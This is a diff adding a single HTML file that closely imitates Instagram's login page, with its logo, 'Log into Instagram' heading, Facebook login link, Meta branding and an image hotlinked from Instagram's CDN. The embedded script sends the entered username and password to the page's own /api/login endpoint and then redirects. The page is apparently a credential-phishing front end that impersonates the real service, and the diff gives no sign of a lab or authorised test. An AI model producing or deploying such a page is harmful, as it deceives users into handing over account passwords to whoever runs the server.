@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login • Instagram</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #000000;
+      color: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+
+    /* Main Container Layout */
+    .page-container {
+      display: flex;
+      width: 100%;
+      max-width: 935px;
+      height: 580px;
+      align-items: center;
+      justify-content: space-between;
+      gap: 32px;
+      padding: 0 20px;
+    }
+
+    /* Left Side Branding */
+    .left-branding {
+      flex: 1.1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      max-width: 450px;
+    }
+
+    .ig-logo-badge {
+      width: 32px;
+      height: 32px;
+      margin-bottom: 24px;
+    }
+
+    .left-branding h1 {
+      font-size: 3rem;
+      font-weight: 700;
+      line-height: 1.15;
+      color: #ffffff;
+      margin-bottom: 30px;
+      letter-spacing: -0.5px;
+    }
+
+    .left-branding h1 .gradient-text {
+      background: linear-gradient(90deg, #f58529 0%, #dd2a7b 50%, #8134af 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    /* Official Image Container */
+    .mockup-container {
+      width: 100%;
+      max-width: 380px;
+    }
+
+    .mockup-container img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    /* Right Side Auth Box */
+    .right-auth {
+      width: 350px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .auth-card {
+      background-color: #000000;
+      border: 1px solid #262626;
+      border-radius: 1px;
+      padding: 30px 40px;
+      text-align: center;
+    }
+
+    .auth-card h2 {
+      font-size: 1.05rem;
+      font-weight: 600;
+      color: #f5f5f5;
+      margin-bottom: 24px;
+      text-align: left;
+    }
+
+    .input-box {
+      position: relative;
+      margin-bottom: 6px;
+    }
+
+    .input-box input {
+      width: 100%;
+      background: #121212;
+      border: 1px solid #363636;
+      border-radius: 3px;
+      color: #f5f5f5;
+      font-size: 12px;
+      padding: 14px 8px 10px 8px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .input-box input:focus {
+      border-color: #a8a8a8;
+    }
+
+    .input-box label {
+      position: absolute;
+      left: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #737373;
+      font-size: 12px;
+      pointer-events: none;
+      transition: all 0.1s ease-in-out;
+    }
+
+    .input-box input:focus ~ label,
+    .input-box input:not(:placeholder-shown) ~ label {
+      top: 6px;
+      font-size: 9px;
+      color: #a8a8a8;
+    }
+
+    .login-btn {
+      width: 100%;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 8px;
+      color: #ffffff;
+      font-weight: 600;
+      font-size: 14px;
+      padding: 7px;
+      margin-top: 14px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .login-btn:hover {
+      background-color: #1877f2;
+    }
+
+    .login-btn:disabled {
+      background-color: rgba(0, 149, 246, 0.3);
+      cursor: not-allowed;
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      margin: 18px 0;
+      color: #737373;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .separator::before, .separator::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #262626;
+    }
+
+    .separator::before { margin-right: 18px; }
+    .separator::after { margin-left: 18px; }
+
+    .fb-link {
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+
+    .forgot-link {
+      color: #e0f1ff;
+      font-size: 12px;
+      text-decoration: none;
+      display: block;
+      margin-top: 6px;
+    }
+
+    .register-card {
+      background-color: #000000;
+      border: 1px solid #262626;
+      border-radius: 1px;
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .register-card a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .meta-brand {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+      color: #737373;
+      font-size: 12px;
+      margin-top: 6px;
+    }
+
+    .status-msg {
+      font-size: 12px;
+      margin-top: 10px;
+      padding: 8px;
+      border-radius: 4px;
+    }
+    .status-msg.error { background: rgba(239, 68, 68, 0.15); color: #fca5a5; }
+    .status-msg.success { background: rgba(34, 197, 94, 0.15); color: #86efac; }
+    .hidden { display: none !important; }
+
+    /* Responsive for mobile screens */
+    @media (max-width: 768px) {
+      .left-branding { display: none; }
+      .page-container { justify-content: center; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="page-container">
+    <!-- Left Side Section -->
+    <div class="left-branding">
+      <svg class="ig-logo-badge" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" fill="url(#ig-grad)"/>
+        <defs>
+          <linearGradient id="ig-grad" x1="0" y1="0" x2="24" y2="24" gradientUnits="userSpaceOnUse">
+            <stop stop-color="#f58529"/>
+            <stop offset="0.5" stop-color="#dd2a7b"/>
+            <stop offset="1" stop-color="#8134af"/>
+          </linearGradient>
+        </defs>
+      </svg>
+
+      <h1>See everyday moments from your <span class="gradient-text">close friends.</span></h1>
+
+      <div class="mockup-container">
+        <img src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" alt="Instagram preview phones">
+      </div>
+    </div>
+
+    <!-- Right Side Section -->
+    <div class="right-auth">
+      <div class="auth-card">
+        <h2>Log into Instagram</h2>
+
+        <form id="loginForm">
+          <div class="input-box">
+            <input type="text" id="username" name="username" placeholder=" " required autocomplete="off">
+            <label for="username">Mobile number, username or email</label>
+          </div>
+
+          <div class="input-box">
+            <input type="password" id="password" name="password" placeholder=" " required autocomplete="current-password">
+            <label for="password">Password</label>
+          </div>
+
+          <button type="submit" id="loginBtn" class="login-btn">Log in</button>
+
+          <div id="statusMsg" class="status-msg hidden"></div>
+
+          <div class="separator">OR</div>
+
+          <a href="#" class="fb-link">
+            <svg width="15" height="15" fill="#385185" viewBox="0 0 24 24">
+              <path d="M12 2.04c-5.5 0-10 4.5-10 10 0 5 3.66 9.13 8.44 9.88v-6.99h-2.54v-2.89h2.54v-2.2c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.23.2 2.23.2v2.45h-1.25c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.89h-2.33v6.99c4.78-.75 8.44-4.88 8.44-9.88 0-5.5-4.5-10-10-10z"/>
+            </svg>
+            Log in with Facebook
+          </a>
+
+          <a href="#" class="forgot-link">Forgot password?</a>
+        </form>
+      </div>
+
+      <div class="register-card">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+
+      <div class="meta-brand">
+        <svg width="12" height="12" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm0 2.182c5.422 0 9.818 4.396 9.818 9.818 0 5.422-4.396 9.818-9.818 9.818-5.422 0-9.818-4.396-9.818-9.818 0-5.422 4.396-9.818 9.818-9.818z"/></svg>
+        Meta
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const form = document.getElementById("loginForm");
+      const usernameInput = document.getElementById("username");
+      const passwordInput = document.getElementById("password");
+      const loginBtn = document.getElementById("loginBtn");
+      const statusMsg = document.getElementById("statusMsg");
+
+      function showMessage(text, type) {
+        statusMsg.textContent = text;
+        statusMsg.className = `status-msg ${type}`;
+        statusMsg.classList.remove("hidden");
+      }
+
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!username || !password) {
+          showMessage("Please enter both fields.", "error");
+          return;
+        }
+
+        loginBtn.disabled = true;
+        loginBtn.textContent = "Logging in...";
+        statusMsg.classList.add("hidden");
+
+        try {
+          const response = await fetch("/api/login", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Accept": "application/json"
+            },
+            body: JSON.stringify({
+              username: username,
+              password: password
+            })
+          });
+
+          const result = await response.json();
+
+          if (response.ok && result.success) {
+            showMessage("Success! Redirecting...", "success");
+            setTimeout(() => {
+              window.location.href = result.redirect_url;
+            }, 1000);
+          } else {
+            showMessage(result.message || "Login failed.", "error");
+            loginBtn.disabled = false;
+            loginBtn.textContent = "Log in";
+          }
+        } catch (err) {
+          showMessage("Network error. Please try again.", "error");
+          loginBtn.disabled = false;
+          loginBtn.textContent = "Log in";
+        }
+      });
+    });
+  </script>
+</body>
+</html>
